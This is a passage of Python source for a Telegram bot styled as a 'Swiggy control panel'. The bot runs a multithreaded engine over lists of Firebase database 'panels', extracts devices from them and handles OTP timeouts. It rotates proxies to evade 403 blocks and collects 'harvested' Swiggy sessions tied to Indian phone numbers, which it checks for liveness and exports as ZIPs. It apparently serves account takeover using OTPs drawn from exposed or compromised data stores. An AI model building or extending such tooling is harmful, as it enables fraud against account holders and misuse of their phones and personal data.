            "All Firebase panels will be re-scanned on next run.\n"
            "Press ▶️ Start Scan to begin.",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    # ── CLEAN DEAD PANELS (remove disabled from panels.txt) ──────────────────
    if data == "clean_dead_panels":
        bot.answer_callback_query(call.id, "🧹 Cleaning…")
        disabled_hosts = _load_disabled_panels() | DISABLED_PANELS
        # Remove from STORE
        before = len(STORE.get("panels", []))
        STORE["panels"] = [p for p in STORE.get("panels", [])
                           if (urlparse(p).hostname or "").lower() not in disabled_hosts]
        after = len(STORE["panels"])
        removed = before - after
        save_store()
        # Rewrite panels.txt clean
        try:
            with open(PANELS_FILE, "w", encoding="utf-8") as f:
                for p in STORE["panels"]:
                    f.write(p.rstrip("/") + "/\n")
        except Exception:
            pass
        bot.send_message(
            chat_id,
            f"🧹 <b>Cleaned!</b>\n\n"
            f"🗑 Removed <b>{removed}</b> dead/disabled panels\n"
            f"📋 <b>{after}</b> active panels remaining",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        return

    # ── BACK TO MENU ──────────────────────────────────────────────────────────
    if data == "back_to_menu":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "🏠 Main menu:", reply_markup=_main_keyboard())
        return

    # ── RUN NEWLY ADDED PANELS ────────────────────────────────────────────────
    if data == "run_newly_added":
        bot.answer_callback_query(call.id)
        newly = _NEWLY_ADDED_PANELS.pop(user_id, [])
        if not newly:
            bot.send_message(chat_id, "❌ No newly added panels found. Run from main menu.",
                             reply_markup=_main_keyboard())
            return
        if AUTO_RUNNING:
            bot.send_message(chat_id, "⚠️ Already running! Stop first.", reply_markup=_main_keyboard())
            return
        # Temporarily override panels list to only run new ones
        # We do this by injecting them at front of the queue and starting
        AUTO_RUNNING = True
        LIVE_MSG_ID  = None
        STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
        with LIVE_LOCK:
            LIVE_QUEUE.clear()
        bot.send_message(
            chat_id,
            f"🚀 <b>Running {len(newly)} newly added panel(s)…</b>",
            parse_mode="HTML",
            reply_markup=_main_keyboard(),
        )
        def _run_subset(panel_list):
            global AUTO_RUNNING
            add_to_queue(f"🔍 Scanning {len(panel_list)} newly added panel(s)…")
            workers = STORE.get("workers", WORKERS)
            disabled_hosts = _load_disabled_panels() | DISABLED_PANELS
            for i, panel in enumerate(panel_list, 1):
                if not AUTO_RUNNING:
                    break
                p = panel.strip()
                if p.startswith("http://"):
                    p = "https://" + p[7:]
                if not p.startswith("https://"):
                    p = "https://" + p
                p = p.rstrip("/") + "/"
                host = (urlparse(p).hostname or "").lower()
                if host in disabled_hosts:
                    add_to_queue(f"⛔ Skipped disabled panel: {host}")
                    continue
                panel_name = host[:25]
                add_to_queue(f"[{i}/{len(panel_list)}] Scanning {panel_name}…")
                devs = extract_devices(p, add_to_queue)
                if not devs:
                    if p in _DEAD_THIS_SCAN:
                        _disable_panel(p)
                        add_to_queue(f"💀 {panel_name}: DEAD — auto-disabled")
                    else:
                        add_to_queue(f"⚠️ {panel_name}: no devices")
                    continue
                add_to_queue(f"🚀 {panel_name}: {len(devs)} devices — processing…")
                with ThreadPoolExecutor(max_workers=workers) as ex:
                    futs = [ex.submit(process_device, dev, add_to_queue) for dev in devs]
                    for f in as_completed(futs):
                        try:
                            f.result()
                        except Exception as exc:
                            add_to_queue(f"⚠️ worker error: {exc}")
                add_to_queue(f"✅ {panel_name} complete")
            AUTO_RUNNING = False
            add_to_queue("🏁 Newly added panels scan complete.")

        threading.Thread(target=_run_subset, args=(newly,), daemon=True).start()
        threading.Thread(target=live_status_updater, args=(chat_id,), daemon=True).start()
        return

    # ── RERUN FAILED / TIMEOUT PANELS ─────────────────────────────────────────
    if data == "rerun_failed_panels":
        bot.answer_callback_query(call.id)
        with FAILED_PANELS_LOCK:
            failed = list(FAILED_PANELS)
            FAILED_PANELS.clear()
        if not failed:
            bot.send_message(
                chat_id,
                "✅ No failed/timeout panels recorded yet.\n"
                "Run a scan first — panels with fails or OTP timeouts will appear here.",
                reply_markup=_main_keyboard(),
            )
            return
        if AUTO_RUNNING:
            bot.send_message(chat_id, "⚠️ Already running! Stop first.", reply_markup=_main_keyboard())
            return
        # Clear used numbers only for phones from those failed panels
        # Simplest correct approach: just clear ALL used numbers (same as rerun_used)
        # so those phones get retried
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        # Push failed panels to run_newly_added flow
        _NEWLY_ADDED_PANELS[user_id] = failed
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.add(ib(f"▶️ Run {len(failed)} failed panel(s) now", "run_newly_added"))
        kb.add(ib("🏠 Back to menu", "back_to_menu"))
        bot.send_message(
            chat_id,
            f"⚠️ <b>Rerun Failed/Timeout Panels</b>\n\n"
            f"<b>{len(failed)}</b> panel(s) had failures or OTP timeouts:\n"
            + "\n".join(f"  • <code>{(urlparse(p).hostname or p)[:45]}</code>" for p in failed[:15])
            + (f"\n  … and {len(failed)-15} more" if len(failed) > 15 else "")
            + f"\n\n🗑 Cleared {count} used numbers so they can be retried.",
            parse_mode="HTML",
            reply_markup=kb,
        )
        return

    bot.answer_callback_query(call.id)


# ═══════════════════════════════════════════════════════════════════════════════
# CONTROL PANEL — tabbed dashboard rendered as one editable Telegram message
#   callback namespace: pnl:*  (dispatched at the top of handle_callback)
# ═══════════════════════════════════════════════════════════════════════════════

PANEL_PAGE_SIZE   = 12
PANEL_TABS        = ("home", "panels", "sessions", "accounts", "proxies", "settings", "logs")
_TAB_ICONS        = {
    "home": "🏠", "panels": "📋", "sessions": "📄", "accounts": "👤",
    "proxies": "🌐", "settings": "⚙️", "logs": "📜",
}


def _panel_esc(s: Any) -> str:
    return str(s).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")


# ── mtime-cached JSON reader (avoids re-parsing big files on every tab tap) ────
_JSON_CACHE: dict[str, tuple[float, int, list]] = {}
_JSON_CACHE_LOCK = threading.Lock()


def _read_json_cached(path: Path) -> list:
    try:
        st = path.stat()
    except FileNotFoundError:
        return []
    key = str(path)
    with _JSON_CACHE_LOCK:
        ent = _JSON_CACHE.get(key)
        if ent and ent[0] == st.st_mtime and ent[1] == st.st_size:
            return ent[2]
    data = _load_json_list(path)
    with _JSON_CACHE_LOCK:
        _JSON_CACHE[key] = (st.st_mtime, st.st_size, data)
    return data


# ── which message is "the" panel for a chat (for dedupe + auto-refresh) ───────
_PANEL_STATE: dict[int, dict] = {}
_PANEL_STATE_LOCK = threading.Lock()


def _remember_panel(chat_id: int, msg_id: int, tab: str, page: int) -> None:
    with _PANEL_STATE_LOCK:
        _PANEL_STATE[chat_id] = {"msg_id": msg_id, "tab": tab, "page": page}


def _short_proxy(px: str | None) -> str:
    if not px:
        return "Direct"
    return (px.split("@")[-1] if "@" in px else px)[:34]


def _as_int(v: Any, default: int = 0) -> int:
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def _pager(page: int, pages: int, tab: str) -> list[types.InlineKeyboardButton]:
    """Prev / page indicator / Next buttons for a tab."""
    prev_page = max(0, page - 1)
    next_page = min(pages - 1, page + 1)
    return [
        ib("« Prev", f"pnl:show:{tab}:{prev_page}"),
        ib(f"{page + 1}/{pages}", f"pnl:refresh:{tab}:{page}"),
        ib("Next »", f"pnl:show:{tab}:{next_page}"),
    ]


def _nav_row(kb: types.InlineKeyboardMarkup, current: str) -> None:
    """Append the tab-bar row (active tab marked)."""
    row = []
    for t in PANEL_TABS:
        label = _TAB_ICONS[t] + ("•" if t == current else "")
        row.append(ib(label, f"pnl:show:{t}:0"))
    kb.row(*row)


def _tab_home() -> tuple[str, types.InlineKeyboardMarkup]:
    status = "🟢 RUNNING" if AUTO_RUNNING else "🔴 STOPPED"
    sess = len(_read_json_cached(SESSIONS_FULL))
    panels = len(STORE.get("panels", []))
    disabled = len(_load_disabled_panels() | DISABLED_PANELS)
    with USED_NUMBERS_LOCK:
        used = len(USED_NUMBERS)
    with FAILED_PANELS_LOCK:
        failed = len(FAILED_PANELS)
    px = current_proxy()

    text = (
        "🎛 <b>SWIGGY CONTROL PANEL</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Engine: <b>{status}</b>\n\n"
        "<b>▎RUN</b>\n"
        f"├ Processed   <b>{STATS['processed']}</b>\n"
        f"├ ✅ Wins      <b>{STATS['wins']}</b>\n"
        f"├ ❌ Fails     <b>{STATS['fails']}</b>\n"
        f"└ ⏭ Skipped   <b>{STATS['skipped']}</b>\n\n"
        "<b>▎DATA</b>\n"
        f"├ 💾 Sessions <b>{sess}</b>\n"
        f"├ 📋 Panels    <b>{panels}</b>  (dead {disabled})\n"
        f"├ 🗑 Used      <b>{used}</b>\n"
        f"└ ⚠️ Failed    <b>{failed}</b>\n\n"
        "<b>▎NETWORK</b>\n"
        f"├ 🌐 Proxy     <code>{_panel_esc(_short_proxy(px))}</code>\n"
        f"├ Pool        <b>{len(_proxy_pool)}</b>\n"
        f"└ 403s        <b>{_total_403}</b>"
    )

    kb = types.InlineKeyboardMarkup(row_width=2)
    if AUTO_RUNNING:
        kb.row(ib("⏹ Stop Scan", "pnl:stop"), ib("🔄 Refresh", "pnl:refresh:home:0"))
    else:
        kb.row(ib("▶️ Start Scan", "pnl:start"), ib("🔄 Refresh", "pnl:refresh:home:0"))
    kb.row(
        ib(f"👷 Workers: {STORE.get('workers', WORKERS)}", "pnl:set_workers"),
        ib(f"🧹 Clear Used ({used})", "pnl:clear_used:home:0"),
    )
    kb.row(ib("📄 Sessions", "pnl:show:sessions:0"), ib("📋 Panels", "pnl:show:panels:0"))
    kb.row(ib("👤 Accounts & Orders", "pnl:show:accounts:0"))
    kb.row(ib("🌐 Proxies", "pnl:show:proxies:0"), ib("⚙️ Settings", "pnl:show:settings:0"))
    kb.row(ib("📜 Live Log", "pnl:show:logs:0"))
    kb.row(ib("🔄 Full Reset", "pnl:full_reset"))
    _nav_row(kb, "home")
    return text, kb


def _tab_panels(page: int) -> tuple[str, types.InlineKeyboardMarkup]:
    panels = STORE.get("panels", [])
    disabled = _load_disabled_panels() | DISABLED_PANELS
    total = len(panels)
    pages = max(1, (total + PANEL_PAGE_SIZE - 1) // PANEL_PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    start = page * PANEL_PAGE_SIZE
    chunk = panels[start:start + PANEL_PAGE_SIZE]

    lines = [f"📋 <b>PANELS</b>  <i>({total} total · page {page + 1}/{pages})</i>", ""]
    if not chunk:
        lines.append("No panels yet — tap ➕ Add Panel.")
    for p in chunk:
        hostname = (urlparse(p).hostname or p)
        host_short = (hostname.replace("-default-rtdb.firebaseio.com", "")
                              .replace("-default-rtdb.asia-southeast1.firebasedatabase.app", ""))
        dead = hostname.lower() in disabled
        with _PANEL_ONLINE_LOCK:
            cnt = _PANEL_ONLINE_COUNTS.get(hostname.lower(), -1)
        cnt_str = f" · {cnt}🟢" if cnt >= 0 else ""
        icon = "💀" if dead else ("🔥" if cnt >= 10 else "🟢")
        lines.append(f"{icon}  <code>{_panel_esc(host_short[:38] + cnt_str)}</code>")

    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.row(*_pager(page, pages, "panels"))
    kb.row(ib("➕ Add Panel", "pnl:add_panel"), ib("🧹 Clean Dead", "pnl:clean_dead"))
    kb.row(ib("⚠️ Rerun Failed", "pnl:rerun_failed"))
    _nav_row(kb, "panels")
    return "\n".join(lines), kb


def _tab_sessions(page: int) -> tuple[str, types.InlineKeyboardMarkup]:
    # Use SESSIONS_FULL for status display, SESSIONS_MINIMAL for creds only
    full_recs = _read_json_cached(SESSIONS_FULL)
    ordered = list(reversed(full_recs))
    total = len(ordered)
    pages = max(1, (total + PANEL_PAGE_SIZE - 1) // PANEL_PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    start = page * PANEL_PAGE_SIZE
    chunk = ordered[start:start + PANEL_PAGE_SIZE]

    new_count      = len(_load_json_list(SESSIONS_NEW))
    used_count     = len(_load_json_list(SESSIONS_USED))
    blocked_count  = len(_load_json_list(SESSIONS_BLOCKED))
    relogin_count  = len(_load_json_list(SESSIONS_RELOGIN))

    lines = [
        f"📄 <b>SESSIONS</b>  <i>({total} total · page {page + 1}/{pages})</i>",
        f"🆕 New: <b>{new_count}</b>  🔁 Used: <b>{used_count}</b>  "
        f"⛔ Blocked: <b>{blocked_count}</b>  🔴 Relogin: <b>{relogin_count}</b>",
        "",
    ]
    if not chunk:
        lines.append("No sessions harvested yet.")
    for r in chunk:
        mob = _panel_esc(r.get("mobile", "?"))
        cid = _panel_esc(r.get("customerId", "-") or "-")
        st  = str(r.get("sessionStatus") or "").upper()
        acc_type = str(r.get("accountType") or "").upper()
        if st == "LIVE":
            icon = "🟢"
        elif st in ("EXPIRED", "LOGGED_OUT", "DELETED"):
            icon = "🔴"
        elif acc_type == "NEW" or r.get("needsProfileSetup"):
            icon = "🆕"
        else:
            icon = "⚪"
        lines.append(f"{icon} <code>+91{mob}</code>  cid=<code>{cid}</code>")

    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.row(*_pager(page, pages, "sessions"))
    kb.row(ib("📥 Export ZIP", "pnl:export"), ib("🔍 Check Live", "pnl:check_live"))
    kb.row(ib("📤 Import ZIP", "pnl:import_zip"), ib("🗑 Clear Sessions", "pnl:clear_sessions"))
    kb.row(ib("🔄 Reset New List", "pnl:reset_new_sessions"))
    _nav_row(kb, "sessions")
    return "\n".join(lines), kb


def _tab_accounts(page: int) -> tuple[str, types.InlineKeyboardMarkup]:
    recs = _read_json_cached(SESSIONS_FULL)
    ordered = list(reversed(recs))
    total = len(ordered)
    pages = max(1, (total + PANEL_PAGE_SIZE - 1) // PANEL_PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    start = page * PANEL_PAGE_SIZE
    chunk = ordered[start:start + PANEL_PAGE_SIZE]

    lines = [f"👤 <b>ACCOUNTS</b>  <i>({total} total · page {page + 1}/{pages})</i>", ""]
    kb = types.InlineKeyboardMarkup(row_width=2)
    if not chunk:
        lines.append("No harvested accounts yet.")
    idx = start
    for r in chunk:
        mob = _panel_esc(r.get("mobile", "?"))
        cid = _panel_esc(r.get("customerId", "-") or "-")
        st = str(r.get("sessionStatus") or "").upper()
        mark = "🟢" if st == "LIVE" else "🔴" if st in ("EXPIRED", "UNREGISTERED") else "⚪"
        lines.append(f"{mark} <code>+91{mob}</code>  cid=<code>{cid}</code>")
        kb.row(ib(f"{mark} +91{mob}", f"acct:view:{idx}"))
        idx += 1
    kb.row(*_pager(page, pages, "accounts"))
    kb.row(ib("🔍 Check All Live", "pnl:check_live"), ib("📥 Export ZIP", "pnl:export"))
    _nav_row(kb, "accounts")
    return "\n".join(lines), kb


def _tab_proxies(page: int) -> tuple[str, types.InlineKeyboardMarkup]:
    px = current_proxy()
    pool = list(_proxy_pool)
    total = len(pool)
    pages = max(1, (total + PANEL_PAGE_SIZE - 1) // PANEL_PAGE_SIZE)
    page = max(0, min(page, pages - 1))
    start = page * PANEL_PAGE_SIZE
    chunk = pool[start:start + PANEL_PAGE_SIZE]

    text = (
        "🌐 <b>PROXIES</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"Current: <code>{_panel_esc(_short_proxy(px))}</code>\n"
        f"Pool size: <b>{total}</b>\n"
        f"Total 403s: <b>{_total_403}</b>  |  Consec: <b>{_consec_403}</b>\n"
        f"IP blocked: {'<b>YES ⛔</b>' if _ip_blocked else 'No ✅'}\n"
        f"<i>page {page + 1}/{pages}</i>\n"
    )
    if chunk:
        text += "\n" + "\n".join(
            f"• <code>{_panel_esc(_short_proxy(p))}</code>" for p in chunk
        )
    elif not total:
        text += "\nNo proxies loaded — add them to <code>proxies.txt</code>."

    kb = types.InlineKeyboardMarkup(row_width=3)
    kb.row(*_pager(page, pages, "proxies"))
    kb.row(ib("🔄 Reload", "pnl:reload_proxies"), ib("🔁 Rotate", "pnl:rotate_proxy"))
    kb.row(ib("🧪 Test Pool", "pnl:test_proxies"))
    _nav_row(kb, "proxies")
    return text, kb


def _tab_settings() -> tuple[str, types.InlineKeyboardMarkup]:
    with USED_NUMBERS_LOCK:
        used = len(USED_NUMBERS)
    text = (
        "⚙️ <b>SETTINGS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"👷 Workers        <b>{STORE.get('workers', WORKERS)}</b>\n"
        f"⏱ OTP timeout    <b>{OTP_TIMEOUT}s</b>\n"
        f"🔁 Max retries    <b>{MAX_RETRIES}</b>\n"
        f"🧵 Scan workers   <b>{SCAN_WORKERS}</b>\n"
        f"📅 Max age        <b>{MAX_AGE_MINUTES} min</b>\n"
        f"♻️ Auto-restart   <b>{'On' if AUTO_RESTART else 'Off'}</b>\n"
        f"🗑 Used numbers   <b>{used}</b>\n\n"
        "<i>Workers controls how many devices are processed in parallel.</i>"
    )
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.row(ib(f"👷 Set Workers ({STORE.get('workers', WORKERS)})", "pnl:set_workers"))
    kb.row(ib(f"🧹 Clear Used ({used})", "pnl:clear_used:settings:0"),
           ib("🔁 Re-run All", "pnl:rerun_all:settings:0"))
    kb.row(ib("🗑 Clear Sessions", "pnl:clear_sessions"),
           ib("⚠️ Rerun Failed", "pnl:rerun_failed"))
    _nav_row(kb, "settings")
    return text, kb


def _tab_logs() -> tuple[str, types.InlineKeyboardMarkup]:
    with LIVE_LOCK:
        live = list(LIVE_QUEUE)[-14:]
    recent = _read_json_cached(LOG_FILE)[-8:]
    lines = ["📜 <b>LOGS</b>", "━━━━━━━━━━━━━━━━━━━━━━", "<b>▎Live buffer</b>"]
    if live:
        raw = "\n".join(live)
        if len(raw) > 1800:
            raw = raw[-1800:]
        lines.append("<pre>" + _panel_esc(raw) + "</pre>")
    else:
        lines.append("<i>no live activity — engine idle</i>")
    if recent:
        lines.append("\n<b>▎Recent results</b>")
        for e in reversed(recent):
            icon = "✅" if e.get("status") == "success" else "❌"
            lines.append(
                f"{icon} <code>+91{_panel_esc(e.get('phone', '?'))}</code> "
                f"{_panel_esc(e.get('status', ''))}"
            )
    kb = types.InlineKeyboardMarkup(row_width=2)
    kb.row(ib("🔄 Refresh", "pnl:refresh:logs:0"), ib("🏠 Home", "pnl:show:home:0"))
    _nav_row(kb, "logs")
    return "\n".join(lines), kb


def _panel_build(tab: str, page: int) -> tuple[str, types.InlineKeyboardMarkup]:
    if tab == "panels":
        return _tab_panels(page)
    if tab == "sessions":
        return _tab_sessions(page)
    if tab == "accounts":
        return _tab_accounts(page)
    if tab == "proxies":
        return _tab_proxies(page)
    if tab == "settings":
        return _tab_settings()
    if tab == "logs":
        return _tab_logs()
    return _tab_home()


def _render_panel(chat_id: int, message_id: int | None, tab: str, page: int = 0) -> None:
    if tab not in PANEL_TABS:
        tab = "home"
    text, kb = _panel_build(tab, page)
    if message_id:
        try:
            bot.edit_message_text(
                text, chat_id, message_id, parse_mode="HTML",
                reply_markup=kb, disable_web_page_preview=True,
            )
            _remember_panel(chat_id, message_id, tab, page)
            return
        except Exception as e:
            if "message is not modified" in str(e).lower():
                _remember_panel(chat_id, message_id, tab, page)
                return
    m = bot.send_message(
        chat_id, text, parse_mode="HTML",
        reply_markup=kb, disable_web_page_preview=True,
    )
    _remember_panel(chat_id, m.message_id, tab, page)


def _send_panel(chat_id: int) -> None:
    """Open a fresh control panel, deleting the previous one for this chat."""
    with _PANEL_STATE_LOCK:
        prev = _PANEL_STATE.get(chat_id, {}).get("msg_id")
    if prev:
        try:
            bot.delete_message(chat_id, prev)
        except Exception:
            pass
    _render_panel(chat_id, None, "home", 0)


def _panel_start(chat_id: int) -> tuple[bool, str]:
    """Shared start-scan routine used by the Start button and Re-run All."""
    global AUTO_RUNNING, LIVE_MSG_ID
    if AUTO_RUNNING:
        return False, "Already running"
    if not STORE.get("panels"):
        return False, "Add a panel first"
    AUTO_RUNNING = True
    LIVE_MSG_ID = None
    STATS.update({"processed": 0, "wins": 0, "fails": 0, "skipped": 0})
    with LIVE_LOCK:
        LIVE_QUEUE.clear()
    threading.Thread(target=run_worker, daemon=True).start()
    threading.Thread(target=live_status_updater, args=(chat_id,), daemon=True).start()
    return True, "Scan started"


def _chunk_lines(header: str, lines: list[str], limit: int = 3800) -> list[str]:
    """Split an HTML message into <=limit-char chunks on line boundaries."""
    chunks: list[str] = []
    buf = header
    for ln in lines:
        if buf and len(buf) + len(ln) + 1 > limit:
            chunks.append(buf)
            buf = ln
        else:
            buf = (buf + "\n" + ln) if buf else ln
    if buf:
        chunks.append(buf)
    return chunks or [header]


def _panel_autorefresh() -> None:
    """While the engine runs, keep every open panel live (edit in place)."""
    last_running = False
    while True:
        try:
            running = AUTO_RUNNING
            do_pass = running or last_running  # one final pass after a stop
            last_running = running
            if do_pass:
                with _PANEL_STATE_LOCK:
                    items = list(_PANEL_STATE.items())
                for chat_id, st in items:
                    mid = st.get("msg_id")
                    if not mid:
                        continue
                    if _acct_state(chat_id).get("viewing"):
                        continue
                    try:
                        _render_panel(chat_id, mid, st.get("tab", "home"), st.get("page", 0))
                    except Exception:
                        pass
            time.sleep(4 if running else 2)
        except Exception:
            time.sleep(5)


def _panel_check_live(chat_id: int) -> None:
    all_sess = _load_json_list(SESSIONS_FULL)
    if not all_sess:
        bot.send_message(chat_id, "📂 No sessions to check.", reply_markup=_main_keyboard())
        return
    note = bot.send_message(
        chat_id, f"🔍 Checking <b>{len(all_sess)}</b> sessions… (30–60s)",
        parse_mode="HTML",
    )
    results = check_all_sessions_live(all_sess, log_func=lambda m: None)
    live = [m for m, s in results.items() if s == "LIVE"]
    expired = [m for m, s in results.items() if s == "EXPIRED"]
    errors = [m for m, s in results.items() if s == "ERROR"]
    with _sessions_lock:
        fl = _load_json_list(SESSIONS_FULL)
        now = now_iso()
        for s in fl:
            mob = str(s.get("mobile", "")).strip()
            if mob in results:
                s["sessionStatus"] = results[mob]
                s["sessionStatusCheckedAt"] = now
        _atomic_save(SESSIONS_FULL, fl)
    txt = (
        f"📊 <b>Session Status</b>\n\n"
        f"🟢 Live: <b>{len(live)}</b>  🔴 Expired: <b>{len(expired)}</b>  "
        f"⚠️ Error: <b>{len(errors)}</b>"
    )
    try:
        bot.delete_message(chat_id, note.message_id)
    except Exception:
        pass
    bot.send_message(chat_id, txt, parse_mode="HTML", reply_markup=_main_keyboard())


def _panel_test_proxies(chat_id: int) -> None:
    pool = list(_proxy_pool)
    if not pool:
        bot.send_message(chat_id, "❌ No proxies loaded.", reply_markup=_main_keyboard())
        return
    note = bot.send_message(chat_id, f"🧪 Testing <b>{len(pool)}</b> proxies…", parse_mode="HTML")
    lines = []
    for px in pool:
        ok, result = test_proxy(px, timeout=10)
        label = _panel_esc(_short_proxy(px))
        lines.append(f"{'✅' if ok else '❌'} <code>{label}</code> → {_panel_esc(result)[:40]}")
    try:
        bot.delete_message(chat_id, note.message_id)
    except Exception:
        pass
    chunks = _chunk_lines("🧪 <b>Proxy Health Check</b>\n", lines)
    for i, chunk in enumerate(chunks):
        last = i == len(chunks) - 1
        bot.send_message(
            chat_id, chunk, parse_mode="HTML",
            reply_markup=_main_keyboard() if last else None,
        )


def _handle_panel_callback(call: types.CallbackQuery) -> None:
    global AUTO_RUNNING, LIVE_MSG_ID, _proxy_pool

    chat_id = call.message.chat.id
    msg_id = call.message.message_id
    user_id = call.from_user.id
    parts = call.data.split(":")
    action = parts[1] if len(parts) > 1 else "home"

    tab = parts[2] if len(parts) > 2 and parts[2] in PANEL_TABS else "home"
    page = _as_int(parts[3], 0) if len(parts) > 3 else 0

    # ── navigation ────────────────────────────────────────────────────────────
    if action in ("show", "refresh"):
        _acct_set(chat_id, viewing=False)
        _render_panel(chat_id, msg_id, tab, page)
        bot.answer_callback_query(call.id, "🔄" if action == "refresh" else None)
        return

    # ── engine start/stop ─────────────────────────────────────────────────────
    if action == "start":
        ok, msg = _panel_start(chat_id)
        bot.answer_callback_query(call.id, ("🚀 " if ok else "⚠️ ") + msg)
        _render_panel(chat_id, msg_id, "home", 0)
        return

    if action == "stop":
        AUTO_RUNNING = False
        bot.answer_callback_query(call.id, "⏹ Stopping…")
        _render_panel(chat_id, msg_id, "home", 0)
        return

    # ── state prompts ─────────────────────────────────────────────────────────
    if action == "set_workers":
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "👷 Workers ki number bhejo (1–30):")
        set_state(user_id, step="set_workers")
        return

    if action == "add_panel":
        bot.answer_callback_query(call.id)
        bot.send_message(
            chat_id,
            "📥 <b>Add Firebase Panels</b>\n\n"
            "Paste URLs one per line, comma-separated, or a raw dump:\n\n"
            "<code>https://xxx-default-rtdb.firebaseio.com/</code>\n\n"
            "✅ Duplicates auto-skipped",
            parse_mode="HTML",
        )
        set_state(user_id, step="add_panel")
        return

    # ── quick clears ──────────────────────────────────────────────────────────
    if action in ("clear_used", "rerun_all"):
        with USED_NUMBERS_LOCK:
            count = len(USED_NUMBERS)
            USED_NUMBERS.clear()
        save_store()
        if action == "rerun_all":
            ok, msg = _panel_start(chat_id)
            bot.answer_callback_query(
                call.id, f"🧹 {count} cleared · " + (("🚀 " + msg) if ok else ("⚠️ " + msg))
            )
        else:
            bot.answer_callback_query(call.id, f"🧹 Cleared {count} used")
        _render_panel(chat_id, msg_id, tab, page)
        return

    # ── export ────────────────────────────────────────────────────────────────
    if action == "export":
        recs = _load_json_list(SESSIONS_FULL)
        if not recs:
            bot.answer_callback_query(call.id, "No sessions")
            return
        bot.answer_callback_query(call.id, "📦 Building ZIP…")
        note = bot.send_message(chat_id, f"⏳ Packing <b>{len(recs)}</b> sessions…", parse_mode="HTML")
        try:
            zip_bytes = generate_sessions_zip()
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            tmp = tempfile.NamedTemporaryFile(suffix=".zip", delete=False)
            tmp.write(zip_bytes)
            tmp.close()
            with open(tmp.name, "rb") as doc_file:
                bot.send_document(
                    chat_id, doc_file,
                    visible_file_name=f"swiggy_sessions_{ts}.zip",
                    caption=f"📦 <b>{len(recs)}</b> sessions exported",
                    parse_mode="HTML",
                )
            os.unlink(tmp.name)
            try:
                bot.delete_message(chat_id, note.message_id)
            except Exception:
                pass
        except Exception as e:
            bot.send_message(chat_id, f"❌ Export failed: <code>{_panel_esc(e)}</code>",
                             parse_mode="HTML")
        return

    # ── async diagnostics ─────────────────────────────────────────────────────
    if action == "check_live":
        bot.answer_callback_query(call.id, "🔍 Checking…")
        threading.Thread(target=_panel_check_live, args=(chat_id,), daemon=True).start()
        return

    if action == "test_proxies":
        bot.answer_callback_query(call.id, "🧪 Testing…")
        threading.Thread(target=_panel_test_proxies, args=(chat_id,), daemon=True).start()
        return

    # ── session clearing (confirmation gate) ──────────────────────────────────
    if action == "clear_sessions":
        bot.answer_callback_query(call.id)
        count = len(_load_json_list(SESSIONS_FULL))
        if count == 0:
            bot.send_message(chat_id, "📂 Sessions already empty.", reply_markup=_main_keyboard())
            return
        kb = types.InlineKeyboardMarkup(row_width=2)
        kb.row(ib(f"🗑 YES — delete {count}", "pnl:confirm_clear"),
               ib("❌ Cancel", "pnl:show:sessions:0"))
        bot.send_message(
            chat_id,
            f"⚠️ <b>Delete {count} sessions?</b>\n\n"
            f"sessions.json · sessions_minimal.json · individual files · used numbers\n\n"
            f"<b>Cannot be undone.</b> Export ZIP first for a backup.",
            parse_mode="HTML", reply_markup=kb,
        )
        return

    if action == "confirm_clear":
        bot.answer_callback_query(call.id, "🗑 Clearing…")
        with _sessions_lock:
            old_count = len(_load_json_list(SESSIONS_FULL))
            _atomic_save(SESSIONS_FULL, [])
            _atomic_save(SESSIONS_MINIMAL, [])
        try:
            if INDIVIDUAL_DIR.exists():
                for _fp in INDIVIDUAL_DIR.glob("*.json"):
                    _fp.unlink()
        except Exception:
            pass
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.clear()
        save_store()
        bot.send_message(
            chat_id,
            f"🗑 <b>Cleared {old_count} sessions.</b> Fresh start.",
            parse_mode="HTML", reply_markup=_main_keyboard(),
        )
        _render_panel(chat_id, msg_id, "settings", 0)
        return

    # ── panels maintenance ────────────────────────────────────────────────────
    if action == "clean_dead":
        disabled_hosts = _load_disabled_panels() | DISABLED_PANELS
        before = len(STORE.get("panels", []))
        STORE["panels"] = [p for p in STORE.get("panels", [])
                           if (urlparse(p).hostname or "").lower() not in disabled_hosts]
        after = len(STORE["panels"])
        save_store()
        try:
            with open(PANELS_FILE, "w", encoding="utf-8") as f:
                for p in STORE["panels"]:
                    f.write(p.rstrip("/") + "/\n")
        except Exception:
            pass
        bot.answer_callback_query(call.id, f"🧹 Removed {before - after}")
        _render_panel(chat_id, msg_id, "panels", 0)
        return

    if action == "rerun_failed":
        with FAILED_PANELS_LOCK:
            failed = list(FAILED_PANELS)
            FAILED_PANELS.clear()
        if not failed:
            bot.answer_callback_query(call.id, "✅ No failed panels")
            return
        if AUTO_RUNNING:
            bot.answer_callback_query(call.id, "⚠️ Running — stop first")
            return
        with USED_NUMBERS_LOCK:
            USED_NUMBERS.clear()
        save_store()
        _NEWLY_ADDED_PANELS[user_id] = failed
        kb = types.InlineKeyboardMarkup(row_width=1)
        kb.row(ib(f"▶️ Run {len(failed)} failed panel(s)", "run_newly_added"))
        kb.row(ib("🏠 Back to panel", "pnl:show:panels:0"))
        bot.send_message(
            chat_id,
            f"⚠️ <b>{len(failed)} failed panel(s)</b> queued. Used numbers cleared.\n"
            f"Tap below to re-run them.",
            parse_mode="HTML", reply_markup=kb,
        )
        return

    # ── proxies ───────────────────────────────────────────────────────────────
    if action == "reload_proxies":
        new = load_proxies()
        with _proxy_lock:
            _proxy_pool.clear()
            _proxy_pool.extend(new)
